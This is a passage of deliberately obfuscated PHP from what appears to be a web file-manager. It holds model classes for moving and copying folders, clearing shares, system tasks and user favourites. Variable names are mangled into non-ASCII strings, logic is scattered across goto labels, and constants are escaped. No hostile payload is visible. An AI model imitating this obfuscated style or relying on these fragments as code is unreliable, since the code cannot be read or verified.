$A°èõÔËÍÊ =& $_SERVER[ú∫]; $e¥¨Éƒå«ﬂ = $this->sourceInfo($E®˘‘≈á≤∂); $fá¨“÷ë¶ = $e¥¨Éƒå«ﬂ[$A°èõÔËÍÊ[403]] == $A°èõÔËÍÊ[87]; goto A§Ã‘Ö∑‘î; A§Ã‘Ö∑‘î: $cë”‹áùºµ = $D…™îëœÎè ? $D…™îëœÎè : $e¥¨Éƒå«ﬂ[$A°èõÔËÍÊ[28]]; $eãèé‡‹Ü = $this->fileNameExistCache($b∫¯ÖÖÖª≠, $cë”‹áùºµ); $this->lockMoveStart($E®˘‘≈á≤∂); goto Bøà˘ΩˆïÍ; dπ·¯›–ÊÈ: return $dæ∆ŒÒæ»≥; goto fŸ«íìö£å; fŸ«íìö£å: } private function _moveForce($D„èãöÍ¿ë, $F≥ÑÔô†°∑, $D“◊îΩ¯™È) { goto E≈áÆ˘ŸÃ¿; f≈êôƒŸ‰ã: if (!$eœàâªŸêÿ && $this->moveClearAuth) { Model($Aäå≈åãÁ¢[482])->authClear($D„èãöÍ¿ë); } $CÔäçﬁáÎÃ = $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[423]] == $Aäå≈åãÁ¢[87] && $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[423]] != $Aäå≈åãÁ¢[87]; if ($CÔäçﬁáÎÃ) { $FÆôâÉ”Ã—[$Aäå≈åãÁ¢[422]] = 0; } goto FÃ©üÈﬁíØ; FÃ©üÈﬁíØ: if ($E∫êè›ùï≤) { $fã∆≤ÏﬁÆ≈ = array($Aäå≈åãÁ¢[553] => array($Aäå≈åãÁ¢[512], $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[487]] . $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[395]] . $Aäå≈åãÁ¢[513])); $b∫È¥ãÌ©ô = $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[487]] . $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[395]] . $Aäå≈åãÁ¢[47]; $D•ÚÑ˜¶Ùò = $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[487]] . $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[395]] . $Aäå≈åãÁ¢[47] . $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[395]] . $Aäå≈åãÁ¢[47]; $D‘ÍÿÆœ¿À = array($Aäå≈åãÁ¢[553] => array($Aäå≈åãÁ¢[561], "\x72\x65\160\x6c\141\143\x65\x28\x70\141\x72\145\x6e\164\x4c\x65\166\145\154\54\x27{$b∫È¥ãÌ©ô}\x27\x2c\47{$D•ÚÑ˜¶Ùò}\x27\x29"), $Aäå≈åãÁ¢[549] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[404]], $Aäå≈åãÁ¢[550] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[484]]); if ($CÔäçﬁáÎÃ) { $D‘ÍÿÆœ¿À[$Aäå≈åãÁ¢[422]] = 0; } $this->where($fã∆≤ÏﬁÆ≈)->data($D‘ÍÿÆœ¿À)->save(); } $this->where(array($Aäå≈åãÁ¢[410] => $D„èãöÍ¿ë))->data($FÆôâÉ”Ã—)->save(); return $D„èãöÍ¿ë; goto B——ùÑîçÓ; FÁ¶¢À√∫Î: $E∫êè›ùï≤ = $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[403]] == $Aäå≈åãÁ¢[87]; $FÆôâÉ”Ã— = array($Aäå≈åãÁ¢[394] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[395]], $Aäå≈åãÁ¢[553] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[487]] . $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[395]] . $Aäå≈åãÁ¢[47], $Aäå≈åãÁ¢[549] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[404]], $Aäå≈åãÁ¢[550] => $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[484]], $Aäå≈åãÁ¢[552] => USER_ID, $Aäå≈åãÁ¢[413] => $D“◊îΩ¯™È); $eœàâªŸêÿ = $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[404]] == SourceModel::TYPE_GROUP && $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[404]] == SourceModel::TYPE_GROUP && $Fû“ ßÉ‡ï[$Aäå≈åãÁ¢[484]] == $f“™»Ë¢ﬂæ[$Aäå≈åãÁ¢[484]]; goto f≈êôƒŸ‰ã; E≈áÆ˘ŸÃ¿: $Aäå≈åãÁ¢ =& $_SERVER[ú∫]; $Fû“ ßÉ‡ï = $this->sourceInfo($D„èãöÍ¿ë); $f“™»Ë¢ﬂæ = $this->sourceInfo($F≥ÑÔô†°∑); goto FÁ¶¢À√∫Î; B——ùÑîçÓ: } private function clearShare($cÏ“Ö€≤ﬁŸ, $Eáå–ü‰ª¬) { goto céà””Ëãë; C◊•ƒÒÎ∞Ê: if (!$b¡ãÎ—™ÌÕ) { return; } $e°ëÚ¥‚äû = array($D›Í∂∞è∏ß[395] => array($D›Í∂∞è∏ß[7], $b¡ãÎ—™ÌÕ), $D›Í∂∞è∏ß[475] => 1); $BñˆﬂôµÀ≠ = Model($D›Í∂∞è∏ß[563])->field($D›Í∂∞è∏ß[468])->where($e°ëÚ¥‚äû)->select(); goto F÷ÜØÉ‹’„; F¡Ô≤æë…∂: Model($D›Í∂∞è∏ß[563])->where($e°ëÚ¥‚äû)->save(array($D›Í∂∞è∏ß[475] => 0)); Model($D›Í∂∞è∏ß[564])->where($e°ëÚ¥‚äû)->delete(); goto Dè⁄•üÕ®≠; céà””Ëãë: $D›Í∂∞è∏ß =& $_SERVER[ú∫]; $b¢ìâµ•åÉ = $this->sourceInfo($cÏ“Ö€≤ﬁŸ); $Cëˆ≠µËÓ‹ = $this->sourceInfo($Eáå–ü‰ª¬); goto f‘–Õ¶•Ÿã; f‘–Õ¶•Ÿã: if ($b¢ìâµ•åÉ[$D›Í∂∞è∏ß[484]] == $Cëˆ≠µËÓ‹[$D›Í∂∞è∏ß[484]] && $b¢ìâµ•åÉ[$D›Í∂∞è∏ß[404]] == $D›Í∂∞è∏ß[562]) { return; } $e°ëÚ¥‚äû = array($D›Í∂∞è∏ß[487] => array($D›Í∂∞è∏ß[512], $b¢ìâµ•åÉ[$D›Í∂∞è∏ß[487]] . $cÏ“Ö€≤ﬁŸ . $D›Í∂∞è∏ß[513])); $b¡ãÎ—™ÌÕ = $this->field($D›Í∂∞è∏ß[410])->where($e°ëÚ¥‚äû)->getField($D›Í∂∞è∏ß[395], !0); goto C◊•ƒÒÎ∞Ê; F÷ÜØÉ‹’„: if (!$BñˆﬂôµÀ≠) { return; } $BñˆﬂôµÀ≠ = array_to_keyvalue($BñˆﬂôµÀ≠, $D›Í∂∞è∏ß[33], $D›Í∂∞è∏ß[468]); $e°ëÚ¥‚äû = array($D›Í∂∞è∏ß[468] => array($D›Í∂∞è∏ß[7], $BñˆﬂôµÀ≠)); goto F¡Ô≤æë…∂; Dè⁄•üÕ®≠: } public function copyFolderFromIO($B˘¡ÖÃ˜ñ, $c∞∑±¢à¨›, $a¢á§ÔØ—˘, $FûΩ’¶ﬂàï, $FıÌÁµ‰¶“, $f„Ωß˜Ç»Ù = false) { goto c›¿ëä∞Ÿâ; f¬Œ§ÑÉÂé: Hook::trigger($d™«∏ÈÁúÙ[567]); if ($DÿßÜ„‹§ú) { $this->folderSizeResetChildren($DÿßÜ„‹§ú); } $this->_childrenListClear(); goto F—ßµ∏˘Áö; CÚùÂËçé”: $bèÇ√Ï¿¨Ω = $this->fileNameExist($a¢á§ÔØ—˘, $e»ÿ§Ö‹Ô≈); $DÿßÜ„‹§ú = $this->mkdir($a¢á§ÔØ—˘, $e»ÿ§Ö‹Ô≈, $FûΩ’¶ﬂàï); if (!$bèÇ√Ï¿¨Ω || $FûΩ’¶ﬂàï == REPEAT_RENAME_FOLDER) { $FûΩ’¶ﬂàï = !1; } goto Dù¿÷†áù; Dù¿÷†áù: if ($bèÇ√Ï¿¨Ω) { $this->_childrenAllMake($bèÇ√Ï¿¨Ω); } Hook::trigger($d™«∏ÈÁúÙ[566]); $this->_copyChildTo($B˘¡ÖÃ˜ñ, $c∞∑±¢à¨›, $DÿßÜ„‹§ú, $FûΩ’¶ﬂàï, $Bà‘§Úê˜Á, $FıÌÁµ‰¶“); goto f¬Œ§ÑÉÂé; Eç…Ã˜ÀêÜ: $this->updateModifyTime($a¢á§ÔØ—˘); return $DÿßÜ„‹§ú; goto F–§Ô‹«ïê; D±â◊∆Ë¯¨: Model($d™«∏ÈÁúÙ[450])->linkAdd($Bà‘§Úê˜Á[$d™«∏ÈÁúÙ[529]]); Model($d™«∏ÈÁúÙ[450])->remove($Bà‘§Úê˜Á[$d™«∏ÈÁúÙ[565]]); $this->folderSizeReset($a¢á§ÔØ—˘); goto Eç…Ã˜ÀêÜ; F—ßµ∏˘Áö: Model($d™«∏ÈÁúÙ[532])->addAll($Bà‘§Úê˜Á[$d™«∏ÈÁúÙ[530]], array(), !0); Model($d™«∏ÈÁúÙ[533])->eventCopy($DÿßÜ„‹§ú); $this->saveAll($Bà‘§Úê˜Á[$d™«∏ÈÁúÙ[531]]); goto D±â◊∆Ë¯¨; c›¿ëä∞Ÿâ: $d™«∏ÈÁúÙ =& $_SERVER[ú∫]; $Bà‘§Úê˜Á = array($d™«∏ÈÁúÙ[530] => array(), $d™«∏ÈÁúÙ[531] => array(), $d™«∏ÈÁúÙ[529] => array(), $d™«∏ÈÁúÙ[565] => array()); $e»ÿ§Ö‹Ô≈ = $f„Ωß˜Ç»Ù ? $f„Ωß˜Ç»Ù : $B˘¡ÖÃ˜ñ->pathThis($c∞∑±¢à¨›); goto CÚùÂËçé”; F–§Ô‹«ïê: } private function _copyChildTo($E‰üåÆ—ú, $E„ë·≠äáä, $b“€ŒØ«ïü, $BˆŒÑ∞‘´Ã, &$Cõ∏è∏£¥€, $fØØ˜–ÒÖ≈) { goto A£æ†Ö⁄◊∂; d«›Òôô∂„: $dê‹Î∑™ÿ≠ = $dê‹Î∑™ÿ≠ ? $dê‹Î∑™ÿ≠ : array($d⁄é†ÛÛØê[74] => array(), $d⁄é†ÛÛØê[75] => array()); $cÑè·ê≈†º = array_merge($dê‹Î∑™ÿ≠[$d⁄é†ÛÛØê[74]], $dê‹Î∑™ÿ≠[$d⁄é†ÛÛØê[75]]); $C—˘øü¨ö‰ = $this->_addFiles($E‰üåÆ—ú, $dê‹Î∑™ÿ≠[$d⁄é†ÛÛØê[74]], $fØØ˜–ÒÖ≈); goto CöÆ¿øã¯¶; CïÉ˘Ø™±ü: if (!empty($eÎΩ∆ûÙ∫∆)) { $this->addAll($eÎΩ∆ûÙ∫∆); $this->_childrenListSelect($b“€ŒØ«ïü); } $f≠‹ﬂì¢‘… = $this->_childrenList($b“€ŒØ«ïü); $f≠‹ﬂì¢‘… = array_to_keyvalue($f≠‹ﬂì¢‘…, $d⁄é†ÛÛØê[28]); goto a≠Ë•„»‰≈; a≠Ë•„»‰≈: foreach ($cÑè·ê≈†º as $eèâ≈Í·˜‹) { $fõçÀ±Üôú = $f≠‹ﬂì¢‘…[$eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]]]; $f¯ÜºÁ©˜˜ = $fõçÀ±Üôú[$d⁄é†ÛÛØê[395]]; $this->_copyApplyMeta($fõçÀ±Üôú, $Cõ∏è∏£¥€); if ($eèâ≈Í·˜‹[$d⁄é†ÛÛØê[29]] == $d⁄é†ÛÛØê[77]) { $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[76]] = $E‰üåÆ—ú->getPathInner($eèâ≈Í·˜‹[$d⁄é†ÛÛØê[76]]); $this->_copyChildTo($E‰üåÆ—ú, $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[76]], $f¯ÜºÁ©˜˜, $BˆŒÑ∞‘´Ã, $Cõ∏è∏£¥€, $fØØ˜–ÒÖ≈); } } goto BæÁùŸæñ’; CöÆ¿øã¯¶: $eÎΩ∆ûÙ∫∆ = array(); foreach ($cÑè·ê≈†º as &$eèâ≈Í·˜‹) { goto dÂÔ¿ú¯ùÑ; A∂π™É®úò: if ($BˆŒÑ∞‘´Ã) { $fªèó›⁄Â¬ = $this->fileNameExistCache($b“€ŒØ«ïü, $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]]); if ($fªèó›⁄Â¬) { if ($eèâ≈Í·˜‹[$d⁄é†ÛÛØê[403]] || $BˆŒÑ∞‘´Ã == REPEAT_SKIP) { continue; } if ($BˆŒÑ∞‘´Ã == REPEAT_REPLACE) { $fõçÀ±Üôú = $this->sourceInfoCache($fªèó›⁄Â¬); $CÈé ÎáÙÌ = $this->fileHistory($fõçÀ±Üôú, $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]], $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[78]]); if ($CÈé ÎáÙÌ) { $Cõ∏è∏£¥€[$d⁄é†ÛÛØê[529]][] = $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]]; } continue; } else { if ($BˆŒÑ∞‘´Ã == REPEAT_RENAME) { $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]] = $this->fileNameAutoCache($b“€ŒØ«ïü, $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]], $BˆŒÑ∞‘´Ã, !1); } } } } if (!$eèâ≈Í·˜‹[$d⁄é†ÛÛØê[403]] && $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]]) { $Cõ∏è∏£¥€[$d⁄é†ÛÛØê[529]][] = $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]]; } $eÎΩ∆ûÙ∫∆[] = $this->_makeItemData($eèâ≈Í·˜‹, $AŸ„«ΩÉŸä, $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]]); goto dÆ≠ª©√ÆÜ; DÑ„éÙå•æ: $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[78]] = _get($eèâ≈Í·˜‹, $d⁄é†ÛÛØê[78], 0); $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]] = _get($eèâ≈Í·˜‹, $d⁄é†ÛÛØê[447], 0); if (!isset($eèâ≈Í·˜‹[$d⁄é†ÛÛØê[568]]) && $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]]) { $Cõ∏è∏£¥€[$d⁄é†ÛÛØê[565]][] = $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[447]]; } goto A∂π™É®úò; dÂÔ¿ú¯ùÑ: if (isset($C—˘øü¨ö‰[$eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]]])) { $eèâ≈Í·˜‹ = $C—˘øü¨ö‰[$eèâ≈Í·˜‹[$d⁄é†ÛÛØê[28]]]; } $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[403]] = $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[29]] == $d⁄é†ÛÛØê[77]; $eèâ≈Í·˜‹[$d⁄é†ÛÛØê[405]] = _get($eèâ≈Í·˜‹, $d⁄é†ÛÛØê[168], $d⁄é†ÛÛØê[33]); goto DÑ„éÙå•æ; dÆ≠ª©√ÆÜ: } unset($eèâ≈Í·˜‹); goto CïÉ˘Ø™±ü; A£æ†Ö⁄◊∂: $d⁄é†ÛÛØê =& $_SERVER[ú∫]; $AŸ„«ΩÉŸä = $this->sourceInfoCache($b“€ŒØ«ïü); $dê‹Î∑™ÿ≠ = $E‰üåÆ—ú->listPath($E„ë·≠äáä); goto d«›Òôô∂„; BæÁùŸæñ’: } private function _addFiles($Eˆ”ØÂâêÌ, $aå ü…á˜û, $dã©Õ∆∆ËÏ) { goto B»∏â∆éâ‹; fâÂ´‡ÛãË: foreach ($aå ü…á˜û as $Cñ¥›‘Éå¢) { $Eî±‰‹Òîõ[$Cñ¥›‘Éå¢[$aÓÊ¿âè•[28]]] = $Cñ¥›‘Éå¢; } return $Eî±‰‹Òîõ; goto d∞…∆ÊﬁÓ¬; e‹ âàûíá: $Cø¥Â√ÎÚÜ->addAll($FÇÿ€∂ë˜ƒ); $b–Ù—≈Ìô = array($aÓÊ¿âè•[170] => array($aÓÊ¿âè•[7], array_keys($DøáãÉÉ•∞))); $cÍú≤æå∂‡ = $Cø¥Â√ÎÚÜ->where($b–Ù—≈Ìô)->select(); goto dá ıë¥„†; C≠∞›·£¯›: foreach ($cÍú≤æå∂‡ as $b«éõæÙ¨À) { if (!isset($DøáãÉÉ•∞[$b«éõæÙ¨À[$aÓÊ¿âè•[170]]])) { continue; } $Aö´≥±≤àΩ = $DøáãÉÉ•∞[$b«éõæÙ¨À[$aÓÊ¿âè•[170]]]; foreach ($Aö´≥±≤àΩ as &$B¢Ω£˜®¥®) { $B¢Ω£˜®¥®[$aÓÊ¿âè•[447]] = $b«éõæÙ¨À[$aÓÊ¿âè•[447]]; $B¢Ω£˜®¥®[$aÓÊ¿âè•[568]] = !0; } unset($B¢Ω£˜®¥®); } $FÇÿ€∂ë˜ƒ = array(); foreach ($aå ü…á˜û as $eÖ—…Øƒ ó) { if (isset($eÖ—…Øƒ ó[$aÓÊ¿âè•[568]]) && $eÖ—…Øƒ ó[$aÓÊ¿âè•[568]]) { continue; } $d±èèé»¶≈ = $Eˆ”ØÂâêÌ->getPathInner($eÖ—…Øƒ ó[$aÓÊ¿âè•[76]]); $Bœä´¡∫„‡ = $Cø¥Â√ÎÚÜ->addFileMake($d±èèé»¶≈, $eÖ—…Øƒ ó[$aÓÊ¿âè•[78]], $eÖ—…Øƒ ó[$aÓÊ¿âè•[171]], $eÖ—…Øƒ ó[$aÓÊ¿âè•[170]], $eÖ—…Øƒ ó[$aÓÊ¿âè•[28]], $dã©Õ∆∆ËÏ); $FÇÿ€∂ë˜ƒ[] = $Bœä´¡∫„‡; } goto e‹ âàûíá; cëíΩõò◊: $Cø¥Â√ÎÚÜ = Model($aÓÊ¿âè•[571]); $cÍú≤æå∂‡ = $Cø¥Â√ÎÚÜ->where($b–Ù—≈Ìô)->select(); $cÍú≤æå∂‡ = $cÍú≤æå∂‡ ? $cÍú≤æå∂‡ : array(); goto C≠∞›·£¯›; dá ıë¥„†: $cÍú≤æå∂‡ = $cÍú≤æå∂‡ ? $cÍú≤æå∂‡ : array(); foreach ($cÍú≤æå∂‡ as $b«éõæÙ¨À) { if (!isset($DøáãÉÉ•∞[$b«éõæÙ¨À[$aÓÊ¿âè•[170]]])) { continue; } $a´◊Ê¥èãÔ =& $DøáãÉÉ•∞[$b«éõæÙ¨À[$aÓÊ¿âè•[170]]]; foreach ($a´◊Ê¥èãÔ as &$B¢Ω£˜®¥®) { $B¢Ω£˜®¥®[$aÓÊ¿âè•[447]] = $b«éõæÙ¨À[$aÓÊ¿âè•[447]]; } unset($B¢Ω£˜®¥®); } $Eî±‰‹Òîõ = array(); goto fâÂ´‡ÛãË; B»∏â∆éâ‹: $aÓÊ¿âè• =& $_SERVER[ú∫]; if (!$aå ü…á˜û || count($aå ü…á˜û) == 0) { return array(); } $DøáãÉÉ•∞ = array(); goto AäŸªŒÎ©ã; AäŸªŒÎ©ã: foreach ($aå ü…á˜û as &$B¢Ω£˜®¥®) { goto B›•Öë°–ó; e Ñ‡ø“íµ: $CåÊÛÙÇ‘≥ = $Eˆ”ØÂâêÌ->hashMd5($B¢Ω£˜®¥®[$aÓÊ¿âè•[76]]); if (strlen($CåÊÛÙÇ‘≥) > 10 && !isset($DøáãÉÉ•∞[$CåÊÛÙÇ‘≥])) { $DøáãÉÉ•∞[$CåÊÛÙÇ‘≥] = array(); } $B¢Ω£˜®¥®[$aÓÊ¿âè•[171]] = $b»€’›∆ÇÆ; goto CﬁËêóôûÇ; B›•Öë°–ó: Hook::trigger($aÓÊ¿âè•[569], $B¢Ω£˜®¥®); $B¢Ω£˜®¥®[$aÓÊ¿âè•[76]] = $Eˆ”ØÂâêÌ->getPathInner($B¢Ω£˜®¥®[$aÓÊ¿âè•[76]]); $b»€’›∆ÇÆ = $Eˆ”ØÂâêÌ->hashSimple($B¢Ω£˜®¥®[$aÓÊ¿âè•[76]]); goto e Ñ‡ø“íµ; CﬁËêóôûÇ: $B¢Ω£˜®¥®[$aÓÊ¿âè•[170]] = $CåÊÛÙÇ‘≥; Hook::trigger($aÓÊ¿âè•[570], $B¢Ω£˜®¥®); $DøáãÉÉ•∞[$CåÊÛÙÇ‘≥][] =& $B¢Ω£˜®¥®; goto Cõ‚Òå¿Çπ; Cõ‚Òå¿Çπ: if (count($DøáãÉÉ•∞[$CåÊÛÙÇ‘≥]) > 1) { $B¢Ω£˜®¥®[$aÓÊ¿âè•[568]] = !0; } goto Dã‚øÓ§à∞; Dã‚øÓ§à∞: } unset($B¢Ω£˜®¥®); $b–Ù—≈Ìô = array($aÓÊ¿âè•[170] => array($aÓÊ¿âè•[7], array_keys($DøáãÉÉ•∞))); goto cëíΩõò◊; d∞…∆ÊﬁÓ¬: } } define($_SERVER[ú∫][572], $_SERVER[ú∫][573]); goto bÑã ¨üØ; AÖà‹¡“éò: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x74\141\x73\x6b\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\160\145", "\x65\x76\x65\156\x74", "\x74\x69\x6d\145", "\x64\145\x73\143", "\x73\171\x73\164\x65\155", "\145\x6e\141\142\154\x65", "\154\x61\x73\164\122\x75\156", "\163\x6f\162\x74"); public function listData($b°ÿ∞∂‡Ë• = false, $CÑóÂè“ÿÉ = "\x73\x6f\x72\164", $e‡àﬂË“◊á = false) { return parent::listData($b°ÿ∞∂‡Ë•, $CÑóÂè“ÿÉ, $e‡àﬂË“◊á); } public function add($C∞°—Ã◊Öû) { $D∑¿∏Œ•®ƒ =& $_SERVER[ú∫]; $aàŸ£ò¬∞Ó = $this->findByName($C∞°—Ã◊Öû[$D∑¿∏Œ•®ƒ[28]]); if ($aàŸ£ò¬∞Ó) { return !1; } $C∞°—Ã◊Öû[$D∑¿∏Œ•®ƒ[1493]] = 0; $C∞°—Ã◊Öû[$D∑¿∏Œ•®ƒ[1715]] = $this->getSort(); return parent::insert($C∞°—Ã◊Öû); } private function getSort() { $b¥–ü˘Ô•∞ =& $_SERVER[ú∫]; $D€« ÇÛ’ﬁ = parent::listData(); $A±Ù∑èì§à = array_to_keyvalue($D€« ÇÛ’ﬁ, $b¥–ü˘Ô•∞[33], $b¥–ü˘Ô•∞[1715]); return empty($A±Ù∑èì§à) ? 0 : max($A±Ù∑èì§à) + 1; } public function update($F°öêç€¿Ï, $f¶Ó¥ë›È”) { $C√»√Ìﬁﬁ =& $_SERVER[ú∫]; $b∞∏ﬂù˘õ∏ = $this->listData($F°öêç€¿Ï); $dûƒñ˜Øäõ = $this->findByName($f¶Ó¥ë›È”[$C√»√Ìﬁﬁ[28]]); if (!$b∞∏ﬂù˘õ∏ || $dûƒñ˜Øäõ && $dûƒñ˜Øäõ[$C√»√Ìﬁﬁ[393]] != $b∞∏ﬂù˘õ∏[$C√»√Ìﬁﬁ[393]]) { return !1; } return parent::update($F°öêç€¿Ï, $f¶Ó¥ë›È”); } public function remove($Bò¿éﬁáº†, $cóØ·Ï¢Û¬ = false) { $F‹ËËáò±Û =& $_SERVER[ú∫]; $Bäó‹∏üŸè = $this->listData($Bò¿éﬁáº†); if (!$Bäó‹∏üŸè) { return; } if (!$cóØ·Ï¢Û¬ && $Bäó‹∏üŸè[$F‹ËËáò±Û[1171]] == $F‹ËËáò±Û[87]) { return !1; } return parent::remove($Bò¿éﬁáº†); } public function enable($aµ∞ë±ß¡ﬂ, $Fπî‰ÃîÏ”) { return $this->update($aµ∞ë±ß¡ﬂ, array($_SERVER[ú∫][2102] => $Fπî‰ÃîÏ”)); } public function run($EÓ¡ø´ä‚¨) { return $this->update($EÓ¡ø´ä‚¨, array($_SERVER[ú∫][2112] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($C”îáõıù) { $BÛÈãäåõ∂ =& $_SERVER[ú∫]; return array($BÛÈãäåõ∂[1794] => array(USER_ID, $BÛÈãäåõ∂[2113])); } protected function listData() { $BÊ·ÌûŒé¿ =& $_SERVER[ú∫]; $fã´öØåŒπ = array($BÊ·ÌûŒé¿[1520] => USER_ID, $BÊ·ÌûŒé¿[463] => 0); $D…Û±çàøú = $BÊ·ÌûŒé¿[2114]; $e∞¬Èìªπé = $this->field($D…Û±çàøú)->where($fã´öØåŒπ)->order($BÊ·ÌûŒé¿[2115])->select(); return $e∞¬Èìªπé ? $e∞¬Èìªπé : array(); } protected function resetCache() { } protected function listView() { goto A∑≤»¿∑¬Ó; F≈√â¿úØ…: $A∞‚Ç∞ãÑÑ = array_to_keyvalue($dÚÈêÔ…≥¡, $CºãÎüÎ–ã[33], $CºãÎüÎ–ã[76]); if (!$A∞‚Ç∞ãÑÑ) { return $B¬•≈ãõŸ”; } $Fü∞Ò¢’ŸÊ = 2000; goto Bî÷úóúÛµ; Bî÷úóúÛµ: $dÀ±‚≈ëë‘ = array($CºãÎüÎ–ã[410] => array($CºãÎüÎ–ã[411], $A∞‚Ç∞ãÑÑ)); $D®±û¯â⁄é = Model($CºãÎüÎ–ã[790])->listSource($dÀ±‚≈ëë‘, $Fü∞Ò¢’ŸÊ); $D®±û¯â⁄é = array_merge($D®±û¯â⁄é[$CºãÎüÎ–ã[74]], $D®±û¯â⁄é[$CºãÎüÎ–ã[75]]); goto fô⁄ÍõÏ‰; A∑≤»¿∑¬Ó: $CºãÎüÎ–ã =& $_SERVER[ú∫]; $B¬•≈ãõŸ” = $this->listData(); $dÚÈêÔ…≥¡ = array_filter_by_field($B¬•≈ãõŸ”, $CºãÎüÎ–ã[29], $CºãÎüÎ–ã[409]); goto F≈√â¿úØ…; fô⁄ÍõÏ‰: $D®±û¯â⁄é = array_to_keyvalue($D®±û¯â⁄é, $CºãÎüÎ–ã[395]); foreach ($B¬•≈ãõŸ” as $B®Ø∆ï¿´è => $DÉﬂÑ”≤ä°) { $fë¬â’≤¢ı = $D®±û¯â⁄é[$DÉﬂÑ”≤ä°[$CºãÎüÎ–ã[76]]]; $fë¬â’≤¢ı = $fë¬â’≤¢ı ? $fë¬â’≤¢ı : array(); $B¬•≈ãõŸ”[$B®Ø∆ï¿´è] = array_merge($fë¬â’≤¢ı, $DÉﬂÑ”≤ä°); } return $B¬•≈ãõŸ”; goto cÊ†èª€®€; cÊ†èª€®€: } protected function addFav($BﬁÙôÍ§åı, $bπâÎ°ãóÉ = '', $fí∞êÕû‘≈ = "\163\157\x75\162\x63\x65") { goto fçÜÃåì¡à; fçÜÃåì¡à: $BÎìåıª∏ä =& $_SERVER[ú∫]; $Dº≤Öíùí = array($BÎìåıª∏ä[1520] => USER_ID, $BÎìåıª∏ä[463] => 0, $BÎìåıª∏ä[415] => $fí∞êÕû‘≈, $BÎìåıª∏ä[414] => $BﬁÙôÍ§åı); if ($this->where($Dº≤Öíùí)->find()) { return !1; } goto c≥èû…ªûå; c≥èû…ªûå: $Dº≤Öíùí = array($BÎìåıª∏ä[1520] => USER_ID, $BÎìåıª∏ä[463] => 0); $cû«Ÿ…Õ£≠ = $this->where($Dº≤Öíùí)->max($BÎìåıª∏ä[1715]); if (!$cû«Ÿ…Õ£≠) { $cû«Ÿ…Õ£≠ = 0; } goto eôÂ‚∞¢ﬂˆ; c‚Î…Ÿ÷ØØ: return $this->add($e¥†êÚ∆ç≥); goto D∫ﬁâ‚¯Ω‰; eôÂ‚∞¢ﬂˆ: if (!$bπâÎ°ãóÉ && $fí∞êÕû‘≈ == $BÎìåıª∏ä[409]) { $fú∆•ΩÑùè = Model($BÎìåıª∏ä[1206])->where(array($BÎìåıª∏ä[410] => $BﬁÙôÍ§åı))->find(); if (!$fú∆•ΩÑùè) { return !1; } $bπâÎ°ãóÉ = $fú∆•ΩÑùè[$BÎìåıª∏ä[28]]; } $bπâÎ°ãóÉ = $this->getAutoName($bπâÎ°ãóÉ); $e¥†êÚ∆ç≥ = array($BÎìåıª∏ä[1520] => USER_ID, $BÎìåıª∏ä[463] => 0, $BÎìåıª∏ä[413] => $bπâÎ°ãóÉ, $BÎìåıª∏ä[414] => $BﬁÙôÍ§åı, $BÎìåıª∏ä[415] => $fí∞êÕû‘≈, $BÎìåıª∏ä[1696] => $cû«Ÿ…Õ£≠ + 1); goto c‚Î…Ÿ÷ØØ; D∫ﬁâ‚¯Ω‰: } protected function remove($D“ã√èúœ¯) { $fÖÑÛÎ≥öﬂ =& $_SERVER[ú∫]; $a¯¨Ò¨¨Ñ˘ = array($fÖÑÛÎ≥öﬂ[1520] => USER_ID, $fÖÑÛÎ≥öﬂ[412] => $D“ã√èúœ¯); return $this->where($a¯¨Ò¨¨Ñ˘)->delete(); } protected function removeByName($b‘ éëÖı…) { $A±ì â›ﬂ– =& $_SERVER[ú∫]; $AäòÇÚœã• = array($A±ì â›ﬂ–[1520] => USER_ID, $A±ì â›ﬂ–[413] => $b‘ éëÖı…, $A±ì â›ﬂ–[463] => 0); return $this->where($AäòÇÚœã•)->delete(); } protected function rename($bä∑é√å ¯, $eµ˘øµä∏ä) { $D‘öÚ∫¶ﬂÉ =& $_SERVER[ú∫]; if ($bä∑é√å ¯ == $eµ˘øµä∏ä) { return !1; } $B”ê¯´‡ªê = $this->getAutoName($eµ˘øµä∏ä); if ($eµ˘øµä∏ä != $B”ê¯´‡ªê) { return !1; } $C≠áËô¯˘ƒ = array($D‘öÚ∫¶ﬂÉ[1520] => USER_ID, $D‘öÚ∫¶ﬂÉ[463] => 0, $D‘öÚ∫¶ﬂÉ[28] => $bä∑é√å ¯); return 